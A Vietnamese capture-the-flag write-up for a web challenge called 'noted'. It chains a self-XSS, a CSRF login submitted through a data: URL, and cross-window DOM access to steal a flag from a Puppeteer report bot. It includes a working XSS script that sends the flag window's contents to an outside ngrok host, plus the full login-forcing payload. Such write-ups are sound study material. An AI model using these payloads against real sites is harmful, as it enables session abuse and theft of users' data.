# noted
## Description
I made a nice web app that lets you take notes. I'm pretty sure I've followed all the best practices so its definitely secure right?
Note that the headless browser used for the "report" feature does not have access to the internet.
## Solution
Bài này cho mình sẵn source code, nhưng mà theo kinh nghiệm thì truớc tiên mình nên thử các feature như blackbox đã truớc khi đọc sourcecode.

Chall mở đầu bằng trang login:

![img](./img/1.png)

Register cred bất kì và vào dashboard: 

![img](./img/3.png)

ở đây có 1 mục tạo noted ( bị dính xss) và 1 mục report URL. Nhưng mà tất cả chỉ dừng lại ở self xss, thôi thì tạm thời thế đã giờ thì review source nào

![img](./img/2.png)

Đáng lưu ý nhất là ở ``report.js``

```
const crypto = require('crypto');
const puppeteer = require('puppeteer');

async function run(url) {
	let browser;

	try {
		module.exports.open = true;
		browser = await puppeteer.launch({
			headless: true,
			pipe: true,
			args: ['--incognito', '--no-sandbox', '--disable-setuid-sandbox'],
			slowMo: 10
		});

		let page = (await browser.pages())[0]

		await page.goto('http://0.0.0.0:8080/register');
		await page.type('[name="username"]', crypto.randomBytes(8).toString('hex'));
		await page.type('[name="password"]', crypto.randomBytes(8).toString('hex'));

		await Promise.all([
			page.click('[type="submit"]'),
			page.waitForNavigation({ waituntil: 'domcontentloaded' })
		]);

		await page.goto('http://0.0.0.0:8080/new');
		await page.type('[name="title"]', 'flag');
		await page.type('[name="content"]', process.env.FLAG ?? 'ctf{flag}');

		await Promise.all([
			page.click('[type="submit"]'),
			page.waitForNavigation({ waituntil: 'domcontentloaded' })
		]);

		await page.goto('about:blank')
		await page.goto(url);
		await page.waitForTimeout(7500);

		await browser.close();
	} catch(e) {
		console.error(e);
		try { await browser.close() } catch(e) {}
	}

	module.exports.open = false;
}

module.exports = { open: false, run }
```
 
con puppeteer bot này dùng headless browser với flag ``--no-sandbox``. Đầu tiên nó sẽ tạo tài khoản bất kì, và tạo 1 note chứa flag trong session tkhoan đó. sau đó nó sẽ browse đến url mà mình gửi

Thông thuờng thì mình có thể khai thác ``self-XSS`` bằng cách sẽ là sử dụng ``CSRF`` để ``POST`` cái login form vào tài khoản của mình để trigger xss. Nhưng mà account mà con bot sử dụng đưọc tạo random cùng với csrf nên cách này sẽ ko thành công. Ngoài ra theo như hint đề bài ``There's more than just HTTP(S)!`` mình còn nghĩ đến chrome devtool protocol như là truy cập voà ``json/list`` của port 9222 rồi exploit tiếp cái websocketdebugurl :D

Nhưng có 1 điểm đặc biệt ở đây, nếu 2 windows X và Y có cùng một ``document.domain``, miễn là chúng lquan đến nhau thì chúng có thể access vào DOM của nhau :DD. Cụ thể nếu X là trang chứa flag rồi sau đó B login vào cred bị dính self-XSS thì B vẫn có thể đọc DOM từ A ( dùng window.open) để lấy flag

![img](./img/4.png)

Reference: [here](https://developer.mozilla.org/en-US/docs/Web/API/Document/domain)

Nhưng mà nếu mà mình muốn gửi POST login thì mình cũng phải chuyển huớng bot đến internet mà đề bài thì lại bảo (``Note that the headless browser used for the "report" feature does not have access to the internet.``). Nma cuối cùng là bịp,vì mình vẫn truy cập dc :D.

Đặc biệt, ở trang report, có vẻ nó không check format của url, tức là ta có thể đấm như thế này ``data:text/html,<script>alert(1)</script>``, ngoài ra ta còn có thể mở window mới để lấy CSRF

Nói chung huớng đi sẽ là
- Ở trang dính self-XSS, mình sẽ viết payload fetch dữ liệu từ window chứa flag và send nó đến ngrok để đọc
- Ở trang ``/report``, ta sẽ gửi payload như sau:
  - Mở window mới với url là trang notes mà chứa flag và đặt tên cho nó (vd: ``flag``)
  - login vào account của mình
  - ``window.location`` trang ``/notes?flag``, lúc này mình sẽ trigger đưọc xss và sẽ fetch đưọc content của trang test

Script fetch dữ liệu:
```
<script>
  if (window.location.search.includes('flag'))
    window.location = 'http://29a5-2402-800-61b1-c507-ae7e-98e9-c6f1-8e15.ngrok.io/?' + window.open('', 'flag').document.body.textContent
</script>

```
note: nên thêm điều kiện check đúng window tên ``flag`` mới fetch chứ ko nó fetch hết mỗi khi mình chui voà ``/notes`` :D

Payload đấm cái url:
```
data:text/html,
<form action="http://0.0.0.0:8080/login" method=POST id=c target=_blank>
  <input type="text" name="username" value="hacker"><input type="text" name="password" value="1">
</form>
<script>
  window.open('http://0.0.0.0:8080/notes', 'flag');
  setTimeout("c.submit()", 1000);
  setTimeout("window.location='http://0.0.0.0:8080/notes?flag'", 1500);
</script>
```
![img](./img/5.png)

## Cách tham khảo thêm: